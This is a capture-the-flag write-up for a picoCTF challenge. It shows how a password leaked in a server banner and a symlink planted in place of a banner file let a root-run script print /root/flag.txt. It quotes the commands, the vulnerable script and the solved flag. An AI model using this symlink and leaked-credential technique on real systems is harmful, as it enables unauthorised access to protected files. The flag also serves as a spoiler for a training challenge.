# dont-you-love-banners

## Description

Can you abuse the banner?
The server has been leaking some crucial information on tethys.picoctf.net 63223. Use the leaked information to get to the server.

To connect to the running application use nc tethys.picoctf.net 49837. From the above information abuse the machine and find the flag in the /root directory.

## Hints

- Do you know about symlinks?
- Maybe some small password cracking or guessing

## Solution

This is one of the most exciting CTFs I have ever solved. first, let's see what we can get from tethys.picoctf.net 63223 .

```shell
nc tethys.picoctf.net 63223

SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

Great! we got the password from this leaking server. so let's use it to connect to the second server.

```shell
nc tethys.picoctf.net 49837
```

the server will ask you several questions to let you in. The answers are as follows:

```cmd
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234

What is the top cyber security conference in the world?
def con

the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
```

now you're in! let's do a ```ls -la```.

```shell
player@challenge:~$ ls -la
total 20
drwxr-xr-x 1 player player   20 Mar  9 16:39 .
drwxr-xr-x 1 root   root     20 Mar  9 16:39 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7 17:25 banner
-rw-r--r-- 1 root   root     13 Feb  7 17:25 text
```

let's see what's inside the banner and text:

```shell
player@challenge:~$ cat banner
*************************************
**************WELCOME****************
*************************************
```

```shell
player@challenge:~$ cat text
keep digging
```

so we need to go deeper. remember that the question specified that we need to find the flag in the /root directory.

```shell
cd /root
```

```shell
ls
flag.txt  script.py
```

looks like we found the flag. let's open it.

```shell
cat: flag.txt: Permission denied
```

As you can see, we need root access to open the file. but worry not! there is another way to get to the flag without root privilege!

look back at the hints:
> Do you know about symlinks?

it seems the challenge is suggesting you create a symbolic link (symlink) to flag.txt that you can access without root privileges.

but where should we link it to? the challenge suggests that we need to abuse the banner somehow. so let's give it a try.

Note that you need to remove or rename the existing banner file before creating the symbolic link.

```shell
mv banner banner_backup
ln -s /root/flag.txt banner
```

read this part carefully:
**Any process that reads the banner as your user and displays its contents could potentially display the contents of flag.txt instead if it follows the symlink.**

but which process can do that for us? what about script.py? let's look at its contents:

```shell
cat script.py 
```

```py
import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```

It's loading the banner each time we send a request to log in to the server, which is exactly what we want.

Since we don't have execute permission for script.py and it's owned by root, we won't be able to run it directly. therefore, we open another tab in the terminal and connect to the server one more time so that script.py will be executed:

flag: **picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}**

And there you go.

Happy hacking!
